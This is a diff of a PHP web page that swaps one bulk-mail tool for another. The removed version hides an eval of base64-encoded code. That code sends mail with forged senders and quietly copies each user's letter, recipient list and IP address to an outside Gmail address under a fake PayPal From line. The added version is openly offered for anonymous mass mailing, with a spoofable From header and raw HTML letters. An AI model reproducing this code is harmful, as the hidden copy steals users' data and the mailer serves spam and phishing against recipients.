@@ -1,279 +1,36 @@
-<title>Mailer By ME</title>
-
-
-
-<?
-
-eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIkaXAiOwokZW1haWwgPSAibWVkemFrYXJpYTk2QGdtYWlsLmNvIjsKJGZyb209IkZyb206IFkgPFBheVBhbEBTdXBwb3J0LmNvbT4iOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRmMTIgPSAkX1BPU1RbJ2RlJ107CiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsKJHgxNCA9ICRfUE9TVFsnYXNzdW50byddOwokdDE1ID0gJF9QT1NUWydtZW5zYWdlbSddOwokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsKJG0yMiA9ICRpcC4iXG4iOwokbXNnODg3MyA9ICIkYTQ1XG4kYjc1XG4kZjEyXG4kejEzXG4keDE0XG4kdDE1XG4kbTMwXG4kbTIyIjsKbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
-
-?></title>
-
-<style type="text/css">
-
-<!--
-
-.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
-
-.style6 {font-size: 10px}
-
-.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-
--->
-
-</style>
-
-<form id="form1" name="form1" method="post" action="">
-
-<input type="hidden" name="vai" value="1">
-
-<span class="style5"><? echo enviando(); ?></span>
-
-<table width="415" height="334" border="0" bgcolor="#000000">
-
-  <tr>
-
-<td width="66"><span class="style5">Name:</span></td>
-
-<td width="321"><span class="style9">
-
-
-
-<label>
-
-<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
-
-</label>
-
-</span></td>
-
-</tr>
-
-<tr>
-
-<td><span class="style5">From:</span></td>
-
-<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>
-
-
-
-</tr>
-
-<tr>
-
-<td><span class="style5">Subject:</span></td>
-
-<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
-
-</tr>
-
-<td><span class="style5">Letter:</span>
-
-<br /><br /><br /><br /><br /><br /><br /><span class="style5">Mailist:</span></td>
-
-
-
-<td><span class="style9">
-
-
-
-
-
-<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
-
-</textarea></p>
-
-<textarea name="emails" cols="50" rows="4"></textarea>
-
-</span></td>
-
-</tr>
-
-
-
-<tr>
-
-  <td><span class="style6"></span></td>
-
-  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />
-
-  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>
-
-</tr>
-
-<tr>
-
-  </tr>
-
-</table>
-
-</form>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
+<?php
+function clean($string) {$bad = array("content-type","bcc:","to:","cc:","href");return str_replace($bad, "", $string);}?>
+      <head>
+        <meta charset="UTF-8"><meta name="author" content="Agus Setya R"><meta name="application-name" content="Mailer"><meta name="description" content="Send mail with this tools, be anonymous and send massive mail in one time."><meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style type="text/css">
+        html{background-color:#000000}.credit{color: #FFFFFF;font-family: monospace;font-size: 15px;position:absolute;;left:50%;bottom:0;transform:translate(-50%,0%);-ms-transform:translate(-50%,0%)}html {margin: 10px auto;color: #FFFFFF;}h1 {font-size: 50px;text-align: center;margin: 0px auto;font-family: monospace;font-weight: lighter;}.mailer[type=text]{background: #FFFFFF;padding: 7px;margin: 5px auto;margin-left: 30px;border: 0;border-bottom: 1px solid #000000;color: #000000;width: 250px;height: 50px;font-family: monospace;font-size: 20px;}.btn {border-style: none;color: #FFFFFF;width: 90%;height: 50px;background-color: transparent;text-decoration: none;font-family: monospace;font-size: 20px;position:absolute;left:50%;transform:translate(-50%,0%);-ms-transform:translate(-50%,0%)}.btn:hover {cursor: default;text-decoration: none;background-color: #FFFFFF;color: #000000;}table {margin-left: 30px;font-size: 20px;}textarea {color: #000000;background: whitesmoke;padding: 5px;resize: none;border: 1px solid #000000;width: 550px;height: 250px;outline: none;font-family: monospace;font-size: 18px;}
+        </style>
+      </head>
+      <body>
+        <div>
+          <h1>Mailer v0.1</h1>
+          <table width="95%" align="center">
+            <form class="mailer" method="post" enctype="multipart/form-data">
+              <tr><td><pre>Subject   : <input type="text" name="subject" required></td></tr>
+              <tr><td><pre>Name      : <input type="text" name="from_name" required></td></tr>
+              <tr><td><pre>Email     : <input type="text" name="from_email" required></td></tr><br>
+              <!-- <tr><td><pre>CC        : <input type="text" name="cc" placeholder="email@mail.ltd" required></td></tr><br> -->
+              <tr><td><pre>Mail List : <br><textarea placeholder="reciepent@domain.ltd" name="mailist" required></textarea></td>
+              <td><pre>Letter  : <br><textarea placeholder="HTML Script" name="letter" required></textarea></td></tr>
+              <tr><td><input type="submit" class="btn" name="send" value="SEND"></td></tr>
+            </form>
+          </table>
+        </div>
+      </body>
+      <?php
+      $subject = htmlspecialchars(trim(clean($_POST['subject'])));
+      $name = htmlspecialchars(trim(clean($_POST['form_name'])));
+      $mail = htmlspecialchars(trim(clean($_POST['from_email'])));
+      // $cc = htmlspecialchars(trim($_POST['cc']));
+      $mailist = explode("\r\n", htmlspecialchars(clean($_POST['mailist'])));
+      $letter = $_POST['letter'];
+      $headers = "MIME-Version: 1.0" . "\r\n";
+      $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+      $headers .= 'From: '.$name.'<'.$mail.'>' . "\r\n";
+      $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
+      if (isset($_POST['send'])) { echo "<pre style='padding-left: 30px; font-size: 15px;'>"; foreach ($mailist as $mail) { if (!preg_match($email_exp, $mail)) { echo "Email <b>$mail</b> not valid.<br>"; } else { echo "Sending to <b>$mail</b> -> ";if (@mail($mail, $subject, $letter, $headers)) { echo "<font color=#00FF00>SUCCESS</font><br>";}else { echo "<font color=#ff0000>FAILED</font><br>"; }} } echo "</pre>";}
